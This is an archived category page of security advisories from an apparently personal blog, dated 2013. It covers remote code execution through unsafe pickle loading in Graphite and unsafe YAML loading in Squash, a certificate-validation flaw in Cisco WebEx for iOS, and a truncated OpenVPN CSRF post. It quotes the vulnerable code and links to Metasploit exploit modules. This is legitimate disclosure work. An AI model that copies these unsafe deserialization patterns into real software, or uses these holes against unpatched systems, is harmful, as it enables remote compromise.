<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US">
<![endif]-->
<!--[if IE 7]>
<html id="ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html id="ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
<base href="http://ceriksen.com" />

<meta charset="UTF-8" />
<meta name="viewport" content="initial-scale=1.0, width=device-width" />
<title>Advisories | ceriksen.com</title>

<link rel="stylesheet" type="text/css" media="all" href="http://ceriksen.com/wp-content/themes/simplex/style.css" />

<!--[if lt IE 9]>
<script src="http://ceriksen.com/wp-content/themes/simplex/js/html5.js" type="text/javascript"></script>
<script src="http://ceriksen.com/wp-content/themes/simplex/js/css3-mediaqueries.js"></script>
<![endif]-->



<link rel='stylesheet' id='crayon-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-twilight-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/themes/twilight/twilight.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=2.5.0' type='text/css' media='all' />
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","fullscreen":"fullscreen","toggleFullscreen":"Toggle fullscreen mode","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction"};
/* ]]> */
</script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/quicktags.min.js?ver=3.8.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
var CrayonTagEditorSettings = {"home_url":"http:\/\/ceriksen.com","css":"crayon-te","css_selected":"crayon-selected","code_css":"#crayon-code","url_css":"#crayon-url","url_info_css":"#crayon-te-url-info","lang_css":"#crayon-lang","title_css":"#crayon-title","mark_css":"#crayon-mark","range_css":"#crayon-range","inline_css":"crayon-inline","inline_hide_css":"crayon-hide-inline","inline_hide_only_css":"crayon-hide-inline-only","hl_css":"#crayon-highlight","switch_html":"#content-html","switch_tmce":"#content-tmce","tinymce_button":"a.mce_crayon_tinymce","submit_css":"#crayon-te-ok","cancel_css":"#crayon-te-cancel","content_css":"#crayon-te-content","dialog_title_css":"#crayon-te-title","submit_wrapper_css":"#crayon-te-submit-wrapper","data_value":"data-value","attr_sep":":","css_sep":"_","fallback_lang":"default","dialog_title_add":"Add Crayon Code","dialog_title_edit":"Edit Crayon Code","submit_add":"Add","submit_edit":"Save","bar":"#crayon-te-bar","bar_content":"#crayon-te-bar-content","extensions":{"scpt":"applescript","applescript":"applescript","swf":"as","fla":"as","cs":"c#","h":"c++","hh":"c++","hpp":"c++","hxx":"c++","h++":"c++","cc":"c++","cpp":"c++","cxx":"c++","c++":"c++","pas":"delphi","java":"java","class":"java","jar":"java","mv":"miva","mvc":"miva","mvt":"miva","m":"objc","mm":"objc","pl":"perl","py":"python","pyw":"python","pyc":"python","pyo":"python","pyd":"python","rb":"ruby","rbx":"ruby","rhtml":"ruby","vbs":"vb"}};
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.te.min.js?ver=2.5.0'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-content/themes/simplex/lib/js/jquery.fitvids.js?ver=3.8.3'></script>

 

<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-32892239-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>

	<script type="text/javascript">
		jQuery(document).ready(function(){
			jQuery("#page").fitVids();	 
		});
	</script>	<style type="text/css">
			#site-title a,
		#site-description {
			color: #e6941e !important;
		}
		</style>
	
</head>

<body lang="en" class="archive category category-advisories category-3  single-author">
<div id="page" class="hfeed">
	<header id="branding" role="banner">
		<hgroup>
			<h1 id="site-title"><a href="http://ceriksen.com/" title="ceriksen.com" rel="home">ceriksen.com</a></h1>
			<h2 id="site-description"></h2>
						
							<form role="search" method="get" id="searchform" class="searchform" action="http://ceriksen.com/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form>					</hgroup>
		
		<nav id="access" role="navigation">
			<h2 class="assistive-text">Main menu</h2>
			<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>

			<div class="menu"><ul><li ><a href="http://ceriksen.com/">Home</a></li></ul></div>

		</nav><!-- #access -->
		<div class="clear"></div>
	</header><!-- #branding -->

	<div id="main">
		<section id="primary">
			<div id="content" role="main">

			
				<header class="page-header">
					<h2 class="page-title">Category Archives: <span>Advisories</span></h2>

					
				</header>

					<nav id="nav-above">
		<h2 class="assistive-text">Post navigation</h2>

		
		
						<div class="nav-previous"><a href="http://ceriksen.com/category/advisories/page/2/" ><span class="meta-nav">&larr;</span> Older posts</a></div>
				
						
		
	
	</nav><!-- #nav-above -->
	
								
					
<article id="post-292" class="post-292 post type-post status-publish format-standard hentry category-advisories tag-graphite tag-re">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/" title="4:01 pm" rel="bookmark" class="entry-date"><time datetime="2013-08-20T16:01:50+00:00" pubdate>August 20, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/" title="Permalink to Graphite remote code execution vulnerability advisory" rel="bookmark">Graphite remote code execution vulnerability advisory</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Introduction</strong><br />
In <a href="http://graphite.wikidot.com/">graphite-web</a> version between 0.9.5 and 0.9.10, a vulnerability exists as a result of unsafe use of the &#8220;pickle&#8221; module by the product.</p>
<p>The Common Vulnerabilities and Exposures (CVE) project has assigned the name CVE-2013-5093 to this issue. This is an entry on the CVE  list (<a href="http://cve.mitre.org/" target="_blank">http://cve.mitre.org</a>), which standardizes names for security problems.</p>
<p><strong>Timeline</strong><br />
2013-08-06 &#8211; Vendor contacted<br />
2013-08-06 &#8211; Vendor confirms issue<br />
2013-08-07 &#8211; Sent CVE request, CVE-2013-5093 is assigned<br />
2013-08-20 &#8211; Graphite 0.9.11 released<br />
2013-08-20 &#8211; Advisory released</p>
<p><strong>Analysis</strong><br />
In graphite-web 0.9.5, a &#8220;clustering&#8221; feature was introduced to allow for scaling for a graphite setup. This was achieved by passing pickles between servers, and it was introduced in <a href="https://github.com/graphite-project/graphite-web/commit/71d395ee68c156da00504cb41d353980e0afb470">this commit</a>.</p>
<p>The function &#8220;renderLocalView&#8221;, seen below, takes a request that contains a chart type, and a pickle:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877176b08493618477" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">Python</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
def renderLocalView(request):
  try:
    start = time()
    reqParams = StringIO(request.raw_post_data)
    graphType = reqParams.readline().strip()
    optionsPickle = reqParams.read()
    reqParams.close()
    graphClass = GraphTypes[graphType]
    options = pickle.loads(optionsPickle)
    image = doImageRender(graphClass, options)
    log.rendering("Delegated rendering request took %.6f seconds" % (time() -  start))
    return buildResponse(image)
  except:
    log.exception("Exception in web.render.views.rawrender")
    return HttpResponseServerError()</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877176b08493618477-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877176b08493618477-2">2</div><div class="crayon-num" data-line="crayon-53c9877176b08493618477-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877176b08493618477-4">4</div><div class="crayon-num" data-line="crayon-53c9877176b08493618477-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877176b08493618477-6">6</div><div class="crayon-num" data-line="crayon-53c9877176b08493618477-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877176b08493618477-8">8</div><div class="crayon-num" data-line="crayon-53c9877176b08493618477-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877176b08493618477-10">10</div><div class="crayon-num" data-line="crayon-53c9877176b08493618477-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877176b08493618477-12">12</div><div class="crayon-num" data-line="crayon-53c9877176b08493618477-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877176b08493618477-14">14</div><div class="crayon-num" data-line="crayon-53c9877176b08493618477-15">15</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877176b08493618477-1"><span class="crayon-r">def</span><span class="crayon-h"> </span><span class="crayon-e">renderLocalView</span><span class="crayon-sy">(</span><span class="crayon-i">request</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877176b08493618477-2"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">try</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-53c9877176b08493618477-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">start</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-k ">time</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877176b08493618477-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">reqParams</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-k ">StringIO</span><span class="crayon-sy">(</span><span class="crayon-v">request</span><span class="crayon-sy">.</span><span class="crayon-i">raw_post_data</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9877176b08493618477-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">graphType</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">reqParams</span><span class="crayon-sy">.</span><span class="crayon-k ">readline</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">strip</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877176b08493618477-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">optionsPickle</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">reqParams</span><span class="crayon-sy">.</span><span class="crayon-e">read</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9877176b08493618477-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">reqParams</span><span class="crayon-sy">.</span><span class="crayon-e">close</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877176b08493618477-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">graphClass</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">GraphTypes</span><span class="crayon-sy">[</span><span class="crayon-i">graphType</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-53c9877176b08493618477-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">options</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-k ">pickle</span><span class="crayon-sy">.</span><span class="crayon-e">loads</span><span class="crayon-sy">(</span><span class="crayon-i">optionsPickle</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877176b08493618477-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">image</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">doImageRender</span><span class="crayon-sy">(</span><span class="crayon-i">graphClass</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">options</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9877176b08493618477-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">log</span><span class="crayon-sy">.</span><span class="crayon-e">rendering</span><span class="crayon-sy">(</span><span class="crayon-s">"Delegated rendering request took %.6f seconds"</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-k ">time</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-i">start</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877176b08493618477-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">buildResponse</span><span class="crayon-sy">(</span><span class="crayon-i">image</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9877176b08493618477-13"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">except</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877176b08493618477-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">log</span><span class="crayon-sy">.</span><span class="crayon-k ">exception</span><span class="crayon-sy">(</span><span class="crayon-s">"Exception in web.render.views.rawrender"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9877176b08493618477-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">HttpResponseServerError</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0087 seconds] -->
<p>However due to no explicit safety measures having been implemented to limit the types of objects that can be unpickled, this creates a condition where arbitrary code can be executed, <a href="http://blog.nelhage.com/2011/03/exploiting-pickle/">as has been documented by Nelson Elhage</a>.</p>
<p><strong>Proof of concept</strong><br />
The proof of concept can be found as a part of the Metasploit Framework <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/graphite_pickle_exec.rb">graphite_pickle_exec module</a>.</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/graphite/" rel="tag">Graphite</a>, <a href="http://ceriksen.com/tag/re/" rel="tag">re</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/#respond" title="Comment on Graphite remote code execution vulnerability advisory">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-292 -->

				
					
<article id="post-282" class="post-282 post type-post status-publish format-standard hentry category-advisories tag-squash">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2013/08/06/squash-remote-code-execution-vulnerability-advisory/" title="6:40 pm" rel="bookmark" class="entry-date"><time datetime="2013-08-06T18:40:19+00:00" pubdate>August 6, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2013/08/06/squash-remote-code-execution-vulnerability-advisory/" title="Permalink to Squash remote code execution vulnerability advisory" rel="bookmark">Squash remote code execution vulnerability advisory</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Introduction</strong></p>
<p>A security flaw in Square&#8217;s open source project &#8220;Squash&#8221; was fixed silently by the developers <a href="https://github.com/SquareSquash/web/commit/6d667c19e96e4f23dccbfbe24afeebd18e98e1c5">June 24th</a>, which I happened to have stumbled upon but not disclosed at the time. But since I couldn&#8217;t find an advisory for it, here it goes. Metasploit module can be found below.</p>
<p>The Common Vulnerabilities and Exposures (CVE) project has assigned the name <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5036">CVE-2013-5036</a> to this issue. This is an entry on the CVE list (<a href="http://cve.mitre.org">http://cve.mitre.org</a>), which standardizes names for security problems.</p>
<p><strong>Analysis</strong></p>
<p>The Squash API is intended for clients to submit details about exceptions and bugs. As a part of that, a YAML dump can be submitted. However before the <a href="https://github.com/SquareSquash/web/commit/6d667c19e96e4f23dccbfbe24afeebd18e98e1c5">patch</a>, without supplying an API key, one could submit a YAML to the functions deobfuscation and sourcemap in app/controllers/api/v1_controller.rb.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717a17b159203226" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">Ruby</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
def deobfuscation
    require_params :api_key, :environment, :build, :namespace

    map = YAML.load(Zlib::Inflate.inflate(Base64.decode64(params['namespace'])))
    return head(:unprocessable_entity) unless map.kind_of?(Squash::Java::Namespace)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717a17b159203226-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a17b159203226-2">2</div><div class="crayon-num" data-line="crayon-53c987717a17b159203226-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a17b159203226-4">4</div><div class="crayon-num" data-line="crayon-53c987717a17b159203226-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717a17b159203226-1"><span class="crayon-r">def</span><span class="crayon-h"> </span><span class="crayon-i">deobfuscation</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a17b159203226-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">require_params</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-i">api_key</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-i">environment</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-i">build</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-i">namespace</span></div><div class="crayon-line" id="crayon-53c987717a17b159203226-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a17b159203226-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">map</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-k ">YAML</span><span class="crayon-sy">.</span><span class="crayon-e">load</span><span class="crayon-sy">(</span><span class="crayon-i">Zlib</span><span class="crayon-o">::</span><span class="crayon-v">Inflate</span><span class="crayon-sy">.</span><span class="crayon-e">inflate</span><span class="crayon-sy">(</span><span class="crayon-v">Base64</span><span class="crayon-sy">.</span><span class="crayon-e">decode64</span><span class="crayon-sy">(</span><span class="crayon-v">params</span><span class="crayon-sy">[</span><span class="crayon-s">'namespace'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c987717a17b159203226-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">head</span><span class="crayon-sy">(</span><span class="crayon-o">:</span><span class="crayon-i">unprocessable_entity</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">unless</span><span class="crayon-h"> </span><span class="crayon-v">map</span><span class="crayon-sy">.</span><span class="crayon-i">kind_of</span><span class="crayon-sy">?</span><span class="crayon-sy">(</span><span class="crayon-i">Squash</span><span class="crayon-o">::</span><span class="crayon-i">Java</span><span class="crayon-o">::</span><span class="crayon-i">Namespace</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0029 seconds] -->
<p>Note that the YAML load is not specified as using the safe load, which means we can exploit this by sending a YAML payload.</p>
<p><strong>Proof of concept</strong></p>
<p><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/squash_yaml_exec.rb">Metasploit module</a></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/squash/" rel="tag">Squash</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2013/08/06/squash-remote-code-execution-vulnerability-advisory/#respond" title="Comment on Squash remote code execution vulnerability advisory">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-282 -->

				
					
<article id="post-268" class="post-268 post type-post status-publish format-standard hentry category-advisories tag-cisco">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/" title="4:19 pm" rel="bookmark" class="entry-date"><time datetime="2013-05-24T16:19:42+00:00" pubdate>May 24, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/" title="Permalink to CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS" rel="bookmark">CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href=" http://secunia.com/advisories/51412/">Secunia SA 51412</a></p>
<p><strong>Information</strong></p>
<p>By default, when creating a connection using iOS you will get a nice helpful warning if you stumble upon a certificate chain that can&#8217;t be verified:</p>
<div id="attachment_269" style="width: 231px" class="wp-caption alignnone"><a href="http://www.dhanjani.com/blog/2010/12/intercepting-ssl-connections-on-ios-and-secure-coding-against-mitm.html"><img class="size-full wp-image-269 " alt="iOS Certifiate Warning" src="http://ceriksen.com/wp-content/uploads/2013/05/ioscertwarning.png" width="221" height="430" /></a><p class="wp-caption-text">Source: <a href="http://www.dhanjani.com/blog/2010/12/intercepting-ssl-connections-on-ios-and-secure-coding-against-mitm.html">http://www.dhanjani.com</a><br />Contains other great information about the subject as well.</p></div>
<p>However some applications <a href="http://www.dhanjani.com/blog/2010/12/intercepting-ssl-connections-on-ios-and-secure-coding-against-mitm.html">override this functionality</a>. In the case, an unfixed vulnerability submitted through <a href="http://secunia.com/community/research/svcrp/">Secunia SVCRP</a> reached its 6 month limit as per <a href="http://secunia.com/community/research/policy/">Secunia&#8217;s disclosure policy</a>. This means that a MITM can replace the certificate on the connection and decrypt the traffic without the user knowing, leading to a loss of confidentiality.</p>
<p>It&#8217;s also interesting to note when you authenticate with the WebEx service, that as you can see below from this burp screenshot, it submits your credentials to not just one, but two WebEx servers; one in the USA, and one in Beijing in China. You&#8217;ve got to wonder what the purpose is of that, though I won&#8217;t speculate about that:</p>
<div id="attachment_270" style="width: 1105px" class="wp-caption alignnone"><a href="http://ceriksen.com/wp-content/uploads/2013/05/webexchina.png"><img class="size-full wp-image-270" alt="WebEx submitting your credentials to China" src="http://ceriksen.com/wp-content/uploads/2013/05/webexchina.png" width="1095" height="525" /></a><p class="wp-caption-text">WebEx submitting your credentials to China</p></div>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/cisco/" rel="tag">Cisco</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/#comments" title="Comment on CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS">1 Comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-268 -->

				
					
<article id="post-256" class="post-256 post type-post status-publish format-standard hentry category-advisories category-security tag-csrf tag-openvpn">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/" title="12:33 am" rel="bookmark" class="entry-date"><time datetime="2013-05-09T00:33:11+00:00" pubdate>May 9, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
